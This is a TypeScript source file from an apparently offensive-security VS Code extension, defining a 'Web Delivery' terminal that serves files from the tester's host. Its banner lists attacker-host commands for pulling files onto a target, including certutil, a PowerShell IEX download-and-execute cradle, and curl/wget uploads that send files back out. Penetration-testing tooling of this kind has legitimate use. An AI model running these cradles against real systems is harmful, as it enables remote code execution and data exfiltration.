import * as vscode from "vscode";
import { logger } from "../../../platform/vscode/logger";
import { BaseWeaponizedTerminalProvider } from "./base";
import { variables } from "../../../platform/vscode/variables";

export const WebDeliveryWeaponizedTerminalProvider =
  new BaseWeaponizedTerminalProvider(
    "Web Delivery",
    () => {
      let webDeliveryCommand = vscode.workspace
        .getConfiguration("weaponized")
        .get<string>("webdelivery");
      if (!webDeliveryCommand) {
        vscode.window.showErrorMessage(
          "Please set the 'weaponized.webdelivery' configuration in settings."
        );
        return [
          "# Please set the 'weaponized.webdelivery' configuration in settings.",
        ];
      }
      let listenon = vscode.workspace
        .getConfiguration("weaponized")
        .get<string>("listenon", "$LISTEN_ON");
      let args: string[] = [
        webDeliveryCommand = variables(webDeliveryCommand).replace("$LISTEN_ON", variables(listenon)),
      ];

      logger.debug(
        `Starting webserver session with args: ${JSON.stringify(args)}`
      );
      return args;
    },
    () => {
      let listenon = variables(vscode.workspace
        .getConfiguration("weaponized")
        .get<string>("listenon", "$LISTEN_ON"));
      let lhost = variables(vscode.workspace
        .getConfiguration("weaponized")
        .get<string>("lhost", "$LHOST"));
      let nl = "\r\n";
      let msg = String.raw`==============================================================================================${nl}                                        WEB DELIVERY BASIC INFO${nl}YOUR IP: ${lhost}      YOUR PORT: ${listenon}${nl}YOUR URL: http://${lhost}:${listenon}/${nl}==============================================================================================${nl}                                        TIPS FOR WEB DELIVERY ${nl}==============================================================================================${nl}                                             DOWNLAODING${nl}${nl}curl --output filename http://${lhost}:${listenon}/fname${nl}wget http://${lhost}:${listenon}/fname${nl}invoke-webrequest -outfile fname -usebasicparsing -uri http://${lhost}:${listenon}/fname${nl}certutil.exe -urlcache -f http://${lhost}:${listenon}/fname fname.exe${nl}==============================================================================================${nl}                                     POWERSHELL MEMORY EXECUTION${nl}${nl}IEX (New-Object Net.WebClient).DownloadString('http://${lhost}:${listenon}/fname')${nl}==============================================================================================${nl}                                            UPLOADING${nl}PS: enable this need pdteam/simplehttpserver with -upload${nl}    and following will put file in uploadfile${nl}${nl}curl http://${lhost}:${listenon}/uploadfile --upload-file filename${nl}curl http://${lhost}:${listenon}/uploadfile -T filename${nl}wget --output-document - --method=PUT http://${lhost}:${listenon}/uploadfile --body-file=filename${nl}invoke-webrequest -Uri http://${lhost}:${listenon}/uploadfile -Method PUT -InFile filename${nl}==============================================================================================${nl}PS: If your terminal can't display this notes properly, you need resize your terminal window.${nl}`;
      return msg;
    }
  );
